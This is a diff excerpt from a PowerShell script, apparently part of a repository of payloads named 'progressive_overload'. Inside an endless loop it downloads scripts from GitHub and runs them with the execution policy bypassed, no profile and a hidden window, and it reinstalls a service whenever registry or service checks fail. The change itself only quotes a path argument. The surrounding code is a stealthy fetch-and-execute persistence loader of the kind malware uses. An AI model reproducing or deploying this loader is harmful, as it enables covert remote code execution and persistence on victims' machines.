@@ -75,12 +75,12 @@ while ($true) {
         }
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
-        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath $basePath
+        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$basePath"
     }
     
     elseif($regS -or $serv){
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
-        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath $basePath
+        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$basePath"
     }
     $canUpdateRootPath=$true
     
